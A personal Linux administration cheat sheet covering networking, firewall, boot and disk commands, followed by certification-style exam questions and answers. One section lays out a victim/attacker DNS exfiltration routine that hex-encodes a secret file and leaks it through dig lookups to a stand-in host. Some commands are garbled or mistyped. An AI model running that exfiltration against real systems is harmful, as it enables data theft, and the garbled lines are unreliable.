--channel
iwconfig eth0 channel 
--mode
iwconfig eth0 mode Managed
iwconfig eth0 mode Ad-Hoc
iwconfig eth0 mode Repeater
iwconfig eth0 mode Secondary
iwconfig eth0 mode Master
iwconfig eth0 mode Monitor
iwconfig eth0 commit

iwlist wlan0 scanning
iwlist wlan0 frequency
iwlist wlan0 rate
iwlist wlan0 keys
iwlist wlan0 power
iwlist wlan0 txpower
iwlist wlan0 retry
iwlist wlan0 event
iwlist wlan0 auth
iwlist wlan0 wpakeys
iwlist wlan0 genie
iwlist wlan0 modulation


## assign the wireless SSID and encryption key values using the iwconfig command:
iwconfig wlan0 essid "MyNetwork" key s:mypassword

otice that the
encryption key is preceded by an s: . That allows you to specify the encryption
key in ASCII text characters










specify the default router for your network, you must use the route
command:
route add default gw 192.168.1.1










## %eth0 part tells the system to send the ping packets out on the eth0 network
interface for the link local address.
ping6 –c 4 fe80::c418:2ed0:aead:cbce%eth0



display a detailed hop-by-hop picture of what’s happening to your network
packets.











start a server, use the –l option to specify a port to listen on:
$ nc –l 8000
Then, on the client system, specify the server’s IP address and the port to
connect to:
$ nc 192.168.1.77 8000







10.0.0.0			10.255.255.255 (10/8 prefix)
172.16.0.0			172.31.255.255 (172.16/12 prefix)
192.168.0.0			192.168.255.255 (192.168/16 prefix)






arp is associated with level 2





route del default
ip route del default


route add -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.1
ip route add 10.1.1.0/24 via 10.1.1.1

route del -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.1
ip route del 10.1.1.0/24 via 10.1.1.1



ip route show
ip addr show


ifconfig eth0 promisc/-promisc
ip link set eth0 promisc on/off

ifconfig eth0 apr/-arp
ip link set eth0 arp on/off


ifconfig etho 10.1.1.120 netmask 255.255.255.0 broadcast 10.1.1.255
ip addr add 10.1.1.120 /24 broadcast 10.1.1.255 dev eth0

ip neigh show

arp -i eth0 -d 10.1.1.120
ip neigh del 10.1.1.120 dev eth0




ip address show
ip route show
route −n
ip neigh show



ip rule ls

ip route list table local

ip route list table main

ip route flush cache

ip address delete 2001:0db8:85a3::0370:7334/64 dev eth1

ip address flush dev eth1 scope global


ip address flush dev eth4 scope global




ip-tunnel
ip-rule 
ip-netns 


ip l2tp show tunnel

ip l2tp add session
ip l2tp show session


l2tp add tunnel and l2tp add session


site-A:# modprobe nf_defrag_ipv4
site-B:# modprobe nf_defrag_ipv4




## ===================================== ##
	route add default gw 10.1.1.1
## ------------------------------------- ##
	ip route add default via 10.1.1.1
## ===================================== ##


## ================================= ##
		route del default
## -------------------------------- ##
		ip route del default
## ================================= ##



## =========================================================================== ##
		route add -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.1
## --------------------------------------------------------------------------- ##
			ip route add 10.1.1.0/24 via 10.1.1.1
## =========================================================================== ##


## =========================================================================== ##
		route del -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.1
## --------------------------------------------------------------------------- ##
				ip route del 10.1.1.0/24 via 10.1.1.1
## =========================================================================== ##4



## ================================= ##
				route
## -------------------------------- ##
			ip route show
## ================================= ##


## ================================= ##
				ifconfig
## -------------------------------- ##
			ip addr show
## ================================= ##



ip link set dev wlan0 address 00:30:65:39:2e:77
ifconfig wlan0 hw ether 00:30:65:39:2e:77



## ================================= ##
	ifconfig eth0 promisc/-promisc
## -------------------------------- ##
	ip link set eth0 promisc on/off
## ================================= ##


## ================================= ##
		ifconfig eth0 apr/-arp
## -------------------------------- ##
	ip link set eth0 arp on/off
## ================================= ##



## =========================================================================== ##
	ifconfig etho 10.1.1.120 netmask 255.255.255.0 broadcast 10.1.1.255
## --------------------------------------------------------------------------- ##
		ip addr add 10.1.1.120 /24 broadcast 10.1.1.255 dev eth0
## =========================================================================== ##


## ================================= ##
				 arp
## -------------------------------- ##
			ip neigh show
## ================================= ##


## ================================= ##
		arp -i eth0 -d 10.1.1.120
## -------------------------------- ##
	ip neigh del 10.1.1.120 dev eth0 
## ================================= ##




               echo "## ############# ###"
               echo "## flush ip rules  ##"
               echo "## ############# ###"
                         ip rule flush
                         ip route flush
                    ip link delete dev lo
               echo "## ##################### ###"
               echo "## flush address labels ##"
               echo "## ##################### ###"
                         ip addrlabel flush





ethtool --show-rxfh-indir
ethtool --help
ethtool --get-dump eth0
ethtool --eeprom-dump eth0
ethtool --show-eee eth0
ethtool --show-priv-flags eth0
ethtool --register-dump eth0
ethtool --register-dump wlan0
ethtool --register-dump eth0 raw on
ethtool --register-dump eth0 hex on
ethtool --show-coalesce
ethtool 
ethtool --show-ring
ethtool rx on
ethtool eth0 rx on
ethtool -h
ethtool --module-info
ethtool eth0 --module-info
ethtool --show-channels eth0
ethtool --show-time-stamping eth0
ethtool --show-rxfh-indir eth0
ethtool --show-*
ethtool --show-* eth0
ethtool -K eth0
ethtool eth0 --show-features
ethtool --show-features eth0



ifconfig -a | grep -E '(^eth|RX.*dropped)'
ethtool -S eth0
awk '{ print $1, $5 }' /proc/net/dev
awk '{ print $1, $5 }' /proc/net/
cat /proc/net/*










iwconfig wlan1

iwlist wlan1 
iwlist wlan1 peers
iwlist wlan1 accesspoints
iwlist wlan1 power

nmcli device status
nmcli dev show



--list-bearers

--list-modems
--monitor-modems
--scan-modems

--monitor-state
--disable
--reset



--location-status
--location-get


--location-enable-gps-nmea
--location-disable-gps-nmea
--location-get-gps-nmea
--location-enable-gps-raw
--location-disable-gps-raw


--messaging-status









sudo mmcli -m 0 --location-get







An example of RAW GPS location information:

           $ sudo mmcli -m 0 --location-get-gps-raw
           /org/freedesktop/ModemManager1/Modem/0
             -------------------------
             Raw GPS         |  UTC time: '155142.2'
                             | Longitude: '-3.513941'
                             |  Latitude: '40.502603'
                             |  Altitude: '18.000000'

see the GPS-specific locations are enabled:

           $ mmcli -m 0 --location-status
           /org/freedesktop/ModemManager1/Modem/0
             ----------------------------
             Location | capabilities: '3gpp-lac-ci, gps-raw, gps-nmea'
                      |      enabled: '3gpp-lac-ci, gps-raw, gps-nmea'
                      |      signals: 'no'













-k • Allows the server to continue listening after a client disconnects






de\

ip a | grep "state UP"
ip link show dev wlan0
ip route
tcpdump -i -w /var/log/tcpdump. wlan0










~]# systemctl restart systemd -ho stnamed

hostnamectl status

ho stnamectl set-ho stname

hostnamectl set-hostname "xe1phix" --pretty

## Changing Host Names Remotely
hostnamectl set-hostname -H [username]@ hostname


query the static host name
~]$ nmcl i g eneral ho stname












• Add a route with a gateway
route add -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.1


 • Add a route with a default gateway
route add default gw 10.1.1.1


 • Remove a static route
route del -net 10.1.1.0 netmark 255.255.255.0 gw 10.1.1.1

 • Remove a default gateway
route del default







• Displays flags (UP, BROADCST, MULTICAST, RUNNING), 
mtu (maximum transmission unit - default 1500), 
inet xx.xx.xx.xx (IPv4 address), 
netmask xx.xx.xx.xx, 
broadcast address

 inet6 xx:xx:xx:xx:xx:xx (IPv6 address), 
 txqueuelan # (the speed of the device), 
 RX packets (received correctly), 
 RX errors (received errors), 
 TX packets (transmitted correctly), 
 TX errors (transmission errors)



ifconfig [adapter] [IPv4 address] netmask [netmask value] broadcast [broadcast address]



• Turn promiscuous mode on/off
ifconfig promisc/-promisc


• Turns arp on/off on the specified adapter
ifconfig [adapter] arp/-arp




route add default gw 10.1.1.1  
ip route add default via 10.1.1.1


route del default
ip route del default


route add -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.1
ip route add 10.1.1.0/24 via 10.1.1.1

route del -net 10.1.1.0 netmask 255.255.255.0 gw 10.1.1.1
ip route del 10.1.1.0/24 via 10.1.1.1


route
ip route show

ifconfig
ip addr show


ifconfig eth0 promisc/-promisc
ip link set eth0 promisc on/off


ifconfig eth0 apr/-arp
ip link set eth0 arp on/off

ifconfig etho 10.1.1.120 netmask 255.255.255.0 broadcast 10.1.1.255
ip addr add 10.1.1.120 /24 broadcast 10.1.1.255 dev eth0


arp
ip neigh show


arp -i eth0 -d 10.1.1.120
ip neigh del 10.1.1.120 dev eth0



Address resolution protocol, part of the network layer
arp is associated with level 2 in this model as it is mapped to
MAC addresses (a unique identifier for any network device),

displays all active adapters and their arp configuration (Address, HWType, HWAddress,
Flags mask, Iface)


arp -i [interface]			## Specify the adapter interface with which to work
arp -d [hostname]			## Deletes the arp information for the specified host




iwconfig - configures wireless 
extracted from /proc/net/wireless
(
mode, 
frequency of connection, 
detected transmission power, 
RTS, power
management)




iwlist scan 			## Used to probe available (visible) wireless connection access points




## information regarding the state, connection, and responsiveness of the intermediate hosts.
## mtr will continue to send ICMP packets indefinitely by default.




## host command queries the DNS server to determine the IP addresses
## assigned to the specified hostname.


## You can also specify an IP address for the host command, and it will attempt to
## find the hostname associated with it:
host 107.170.40.56



netstat -nao | findstr LISTENING         


dig command displays all of
the DNS data records associated with a specific host or network.

# Perform a reverse DNS lookup
dig -x 74.125.45.100

## Look up DNS data records associated with a mail server:
## The MX data record points to the server that accepts mail for the domain.
dig linux.org MX



iwgetid wlan0
dig @8.8.8.8
dig erowid.org
traceroute erowid.org
whois erowid.org
host erowid.org
ping 209.237.226.93
traceroute 209.237.226.93
dig @209.237.226.93 -t MX erowid.org
dig -x 209.237.226.93
nslookup erowid.org
fping -a 209.237.226.93
bing 209.237.226.93
tracepath 209.237.226.93
mtr tracepath
mtr 209.237.226.93
ftp 209.237.226.93
ftp 209.237.226
host erowid.org
host 209.237.226.10
dig 209.237.226.10




dhcpdump -i wlan0

ip route
route -en
ip route -C
route -C
netstat -rn


dig @8.8.8.8
dig erowid.org
traceroute erowid.org
whois erowid.org
host erowid.org
ping 209.237.226.93
traceroute 209.237.226.93
dig @209.237.226.93 -t MX erowid.org
dig -x 209.237.226.93
nslookup erowid.org
fping -a 209.237.226.93
bing 209.237.226.93
tracepath 209.237.226.93
mtr tracepath
mtr 209.237.226.93
ftp 209.237.226.93
ftp 209.237.226
host erowid.org
host 209.237.226.10
dig 209.237.226.10





mtr collects additional information regarding the 
state, connection, and responsiveness of the intermediate hosts.

mtr will continue to send ICMP packets indefinitely by default.

-c count Send count number of probe packets, then stop
-n Do not reverse resolve IP addresses to hostnames









the nc command can be used to check for open ports:

nc -z localhost 1-1023





displays
statistics for the different types of packets that the system has used on the
network:
netstat -s


## ss - view network socket statistics
## display detailed socket information, 
## such as the send and receive queues for the sockets:
-a List all sockets. This includes sockets in listening state.
-n Do not resolve port names.
-l Only display listening sockets.
-p Show processes using the sockets
-t Restrict output to TCP sockets
-u Restrict output to UDP sockets






## The main log file on Debian-based distributions
/var/log/syslog


## The main log file on Red Hat- or CentOS-based distributions
/var/log/messages



The
/etc/hosts.allow file lists clients that are allowed to connect to the network
applications on the system, while the /etc/hosts.deny file lists clients that are
blocked from accessing the network applications.



tcp_wrappers acts as a middleman, 
intercepting client connections to the application.




















## use ssh to pipe the disk image over ssh to the remote machine
dd if=/dev/hda1 | ssh username@192.168.0.2 "cat > /home/username/hda1_drive_image.img"


## To reimage /dev/hda1 with a file you have saved
dd if=/mnt/hdb1/hda1_drive_image.img of=/dev/hda1

## Restore Hard drive Image Through The network Tunneled over SSH
ssh username@192.168.0.2 "cat /home/username/hda1_drive_image.img" | dd of=/dev/hda1









echo "##-============================================================-##"
echo "   [+] Disable All Traffic Not Explicity Allowed by iptables		"
echo "##-============================================================-##"
iptables -A INPUT -j REJECT --reject-with icmp-host-prohibited > /dev/null

iptables save &>/dev/null









/etc/firewalld/services/service.xml
/usr/lib/firewalld/services/service.xml

--list-lockdown-whitelist-users


firewallctl list services
firewallctl info service 





sudo firewall - cmd - - get - ac t ive - zones


sudo firewall - cmd - - zone=wo r k - - li s t - all




firewall-cmd --list-rich-rules


firewall-cmd --add-rich-rule='<RULE>'


firewall-cmd --query-rich-rule='<RULE>'


firewall-cmd --add-rich-rule='rule service name=ftp limit value=2/m accept'


echo "drop all incoming ipsec ESP protocol packets from anywhere In the default zone"
firewall-cmd --permanent --add-rich-rule='rule protocol value=esp drop'






echo "reject sends an ICMP packet detailing why a connection was rejected"

echo "drop just drops the packet and does nothing else"





firewallctl info zones
config get 
default-zone
lockdown
panic
log-denied

config set
lockdown { on


config list



ufw allow ssh
    ufw allow http
    ufw deny 23
    ufw default deny
    ufw enable














echo -e "\t## ============================================================================ ##"
echo -e "\t## ---------------------------------------------------------------------------- ##"
echo -e "\t## ========================== DNS TRANSFER ON LINUX =========================== ##"
echo -e "\t## ---------------------------------------------------------------------------- ##"
echo -e "\t## ============================================================================ ##"



echo -e "\t\t ## =================================================================== ##"
echo -e "\t\t ## ======================= On Victim Machine: ======================== ##"
echo -e "\t\t ## =================================================================== ##"


echo "##-=================================================-##"
echo " 	  [+] Hex encode the file to be transferred			"
echo "##-=================================================-##"
xxd -p secret file.hex


echo "##-=================================================-##"
echo " 	  [+] Read In each line and do a D~S lookup			 "
echo "##-=================================================-##"
for b In `cat fole.hex `; do dig $b.shell.evilexample.com; done




echo -e "\t\t ## =================================================================== ##"
echo -e "\t\t ## ====================== On Attacker Machine: ======================= ##"
echo -e "\t\t ## =================================================================== ##"



echo "##-==================================-##"
echo " 	  [+] Capture DNS Exfil Packets		"
echo "##-==================================-##"
tcdpump -w /tmp/dns -sO port 53 and host sjstem.example.com


echo "##-=================================================-##"
echo " 	  [+] Cut the exfil!ed hex from t~e DNS packet		"
echo "##-=================================================-##"
tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d | cut -fl -d'.' | uniq received. txt


echo "##-=================================-##"
echo " 	  [+] Reverse the hex encoding		"
echo "##-=================================-##"
xxd -r -p receivedu.txt keys.pgp














## =================================================================== ##
## ====================  ======================= ##
## =================================================================== ##

tunneling increases overhead, because it needs an extra set of
IP headers. Typically this is 20 bytes per packet, so if the normal packet size (MTU) on a network is 1500
bytes, a packet that is sent through a tunnel can only be 1480 bytes big












gpg --export --armor Xe1phix > Xe1phix.pub




gpg2 --verify "${DATA_DIR}/coreos_production_update.bin.bz2.sig"
gpg2 --verify "${DATA_DIR}/coreos_production_image.vmlinuz.sig"
gpg2 --verify "${DATA_DIR}/coreos_production_update.zip.sig"

bunzip2 --keep "${DATA_DIR}/coreos_production_update.bin.bz2"
unzip "${DATA_DIR}/coreos_production_update.zip" -d "${DATA_DIR}"







# Set the prefix back to the correct value after we're done with memdisk
set prefix=($root)/coreos/grub
set first_boot="coreos.first_boot=detected"




# Default menuentry id and boot timeout
set default="coreos"
set timeout=1

# Default kernel args for root filesystem, console, and CoreOS.
set linux_root="root=LABEL=ROOT"
set linux_console=""
set first_boot=""
set randomize_disk_guid=""
set oem_id=""



--private_keys "${KEYS_DIR}/devel.key.pem+pkcs11:object=CoreOS_Update_Signing_Key;type=private" \
--public_keys  "${KEYS_DIR}/devel.pub.pem+${KEYS_DIR}/prod-2.pub.pem"


set check_signatures="enforce"


set secure_boot="1"

set randomize_disk_guid=

 Determine if the disk GUID needs to be randomized.
search --no-floppy --set randomize_disk_guid --disk-uuid 

search --no-floppy --set oem --part-label OEM --hint "$root"


e2image -r /dev/hda1 - | bzip2 > hda1.e2i.bz2




e2image -Q /dev/hda1 hda1.qcow2


bzip2 -z hda1.qcow2



###############################################################
## Convert .vmdk to .vdi
###############################################################
$ sudo -u "$user_name" qemu-img convert "$vmdk_file" -O raw "$vdi_file"





xdpyinfo | awk '/dimensions:/ {print $2}'




/etc/issue

• \d 		## Displays the current date

• \s 		## System name

• \m 		## Displays the results of the uname -m command

• \n 		## Node name (equivalent of uname -n )

• \r 		## OS

• \u 		## Display number of users logged in

• \v 		## Version of the OS


Only displayed when a user logs in via the command line login LOCALLY


/etc/issue.net
• Equivalent of the 'issue.net', but displayed for remote network logins
































Test Questions:



What does the first column of the output of vmstat, called ’r’ represent?
The number of processes currently allocated to the processor run queue. processor run queue



Which kernel module has to be loaded on post-2.4 kernels in order for /proc/net/ip_conntrack to exist?
Only if the ipt_MASQUERADE kernel module is loaded will /proc/net/ip_conntrack exist. IP Masquerading

What tools can be used to show block device Input/Output statistics?
iostat, vmstat, and sar are some of the tools that can be used to output block device I/O




iostat	
-p devices and partitions.
-c option shows CPU utilization
-d shows device utilization.





Filters are used within iptraf to define traffic that should be included
or excluded when monitoring.


display real-time
information about disk usage on a per-process basis?

iotop

AptPkg::Cache (3pm)  - APT package cache interface
AptPkg::Config (3pm) - APT configuration interface
AptPkg::hash
AptPkg::hash::method
AptPkg::hash::method::iter.

The hash contains the following keys:

               "FileName", "Checksum-FileSize", "MD5Hash", "SHA256", "SourcePkg", "Maintainer", "ShortDesc", "LongDesc" and "Name"

AptPkg::Cache::VerFile
LongDesc
AptPkg::Cache::DescFile
"Section" and "VerStr"



--audit
dpkg-reconfigure
dpkg-deb
dpkg-source
dpkg-trigger
dpkg-checkbuilddeps

dpkg-buildpackage

dpkg-buildflags

dpkg.cfg

capinfos
editcap
mergecap




cutycapt





debconf-apt-progress






ntop and mrtg both provide
graphical statistics but do not have the alerting capabilities specified.




w command shows a variety of useful information including load
average, logged-in users, and other uptime information.
The uptime
command does not show who is currently logged in.





Which of the following describes a method for changing the sort order
when using the top command

Pressing Shift+F within top enables you to choose which columns
display as well as the sort order for these columns press s to select,



Which of the following netstat options displays the send and receive
queues for each socket?

netstat -a



update every 2 seconds for 10 intervals.
sar -u 2 10 


ncurses-based interface for working with processes, including viewing, 
changing priority, and killing the processes?

htop



vmstat , which statistic represents the time that the CPU spent waiting for I/O?

wa statistic shows time spent waiting for I/O
us statistic is time spent on user space processes
sy is time spent on kernel processes




When viewing information with ps ,what does the RSS column indicate?
The RSS column is Resident Set Size

amount of physical RAM that is allocated to the given process.



The l key will list open files for a given process, assuming that lsof is
installed. The L key performs a library trace if ltrace is available.




which column within iostat output shows the amount (percentage) 
of time spent in an involuntary wait scenario

The steal column shows the percentage of time that was spent waiting
due to the hypervisor stealing cycles for another virtual processor.




Which of the following files contains information about the swap space
including the currently used amount of swap and the disk partitions used for
the swap space?

/proc/swaps


Which of the following tools provides a web interface for network-
related statistics such as bandwidth usage per protocol and host?

ntop 
mrtg and nagios dont provide info on a per-protocol or per-host basis


Which option to the ps command displays information in a wide format?

w

When no interval or count is provided for the sar command, what
information is used as output?

Statistics gathered since last restart


lsof commands will display all open connections for port 80?
lsof -i :80


Which option to iostat causes the display to output in megabytes?
iostat -m



When viewing information with vmstat , you notice that there are two
processes in the b column, indicating uninterruptible sleep. How do you find
which specific processes are currently in uninterruptible sleep mode?

Use ps and look for D in the Stat column.




with htop , which of the following options sets the delay
between updates to 10 seconds?

htop -d 100 
when setting the delay, and the interval is tenths of a
second, thereby needing 100 such intervals to equal 10 seconds.
















What is chain-loading?
Chain-loading implies that GRUB will be used to boot the system, and in turn will load and run the proprietary systems
bootloader, which then boots the operating system.


What does it mean when the action field in the file /etc/inittab contains the string wait?
The process specified in the fourth field of the same line will be started just once when the specified runlevel is entered and
init will wait for its termination.



tune2fs - set the maximum mount count before the system will automatically run fsck:

tune2fs -c 




mount - simulate the mount process

mount -f



xfs_check - verify a filesystem is stored In a file

xfs_check -f 



debugfs - open FS In read-write mode:

debugfs -w



xfsrestore - xfsdump was executed with a block size of 4M. 
which option do you need to invoke on xfsrestore In order for it to use this dump successfully?

xfsrestore -b 4M



/etc/fstab - which are the defaults

rw,suid,dev,exec,auto,nouser,async



/etc/fstab - whats the order used In fstab?

<filesystem>	<mountpoint>	<type>	<options>	<dump>	<pass>




How would you automate RAID activation after reboot using mdadm.conf, if it exists?
Run mdadm --assemble -s in one of the startup files.






make modules_install is used after succesfully building the modules 
This installs them under /lib/modules/<kernel-version>



By which means can a patch be removed from a production kernel?
Either apply the patch again or run the command patch with the -R parameter.



9. By which means may the version of the running kernel be determined?
cat /proc/sys/kernel/osrelease 
uname -r















LUKS - Which key derivation function is used by Luks?

Password Based Key Derivation Function 2 (PBKDF2)





xfsdump - set the maximum size for files to be included In the dump

xfsdump -z 




tune2fs - set the behavior when a filesystem error occurs

tune2fs -e 						## Specify the kernel’s behavior when encountering errors.

tune2fs -e continue				## Continue as usual.
tune2fs -e remount-ro			## Remount the offending filesystem In read-only mode.
tune2fs -e panic				## Cause a kernel panic.





/etc/systemd/system								## {*} which directory stores unit files?





The SYSLINUX bootloader 			## used for FAT filesystems to create rescue disks
									## also used for general installation




EFI (ESP) partitions			## use FAT filesystem type



extlinux --install /boot




systemd - priority order for configuration files 

       ┌────────────────────┬─────────────────────────────┐
       │Path                │ Description                 │
       ├────────────────────┼─────────────────────────────┤
       │/etc/systemd/system │ Local configuration         │
       ├────────────────────┼─────────────────────────────┤
       │/run/systemd/system │ Runtime units               │
       ├────────────────────┼─────────────────────────────┤
       │/lib/systemd/system │ Units of installed packages │
       └────────────────────┴─────────────────────────────┘

/etc/systemd/system/*
/run/systemd/system/*
/lib/systemd/system/*




├─────────────────────────────────────────┼──────────────────────────────────────────────┤
       │$XDG_CONFIG_HOME/systemd/user or         │ User configuration ($XDG_CONFIG_HOME is used │
       │$HOME/.config/systemd/user               │ if set, ~/.config otherwise)                 │
       ├─────────────────────────────────────────┼──────────────────────────────────────────────┤
       │/etc/systemd/user                        │ Local configuration                          │
       ├─────────────────────────────────────────┼──────────────────────────────────────────────┤
       │$XDG_RUNTIME_DIR/systemd/user            │ Runtime units (only used when                │
       │                                         │ $XDG_RUNTIME_DIR is set)                     │
       ├─────────────────────────────────────────┼──────────────────────────────────────────────┤
       │/run/systemd/user                        │ Runtime units                                │
       ├─────────────────────────────────────────┼──────────────────────────────────────────────┤

       ├──────────────────────────────┼───────────────────────────────────────────┤
       │/etc/systemd/system           │ Local configuration                       │
       ├──────────────────────────────┼───────────────────────────────────────────┤
       │/run/systemd/system           │ Runtime units                             │
       ├──────────────────────────────┼───────────────────────────────────────────┤
       │/run/systemd/generator        │ Generated units with medium priority (see │
       │                              │ normal-dir in system.generator(7))        │
       ├──────────────────────────────┼───────────────────────────────────────────┤
       │/usr/local/lib/systemd/system │                                           │
       ├──────────────────────────────┤ Units of installed packages               │
       │/lib/systemd/system           │                                           │
       ├──────────────────────────────┼───────────────────────────────────────────┤

systemd-analyze --user unit-paths

## UEFI - which command controls boot configuration?

bcfg




PXE - which file must exist within /tftpboot to use PXELINUX for its bootloader?

pxelinux.0



fsck command will find errors and automatically
assume that it should repair the errors that it finds?

fsck -ry



grub-install will place the GRUB images into an
alternate directory?

––boot-directory




examining the /etc/inittab file, which option signifies the
default run level to which the system will boot?

initdefault



Using a shim for booting a UEFI-based system, which of the following
files is loaded after shim.efi ?

grubx64.efi




Name the three protocols which are used in an IPSEC implementation.
ESP (Encapsulating Security Payload), AH (Authentication Header) and IKE (Internet Key Exchange).



What ICMP message will be sent back to a traceroute client by every system along the path to the destination specified?
An ICMP TIME_EXCEEDED reply is sent back to the packet’s source address. This is because traceroute sents out a
stream of packets to the destination, starting with the TTL-field set to 1 and incrementing it by one every time until the
destination replies.

















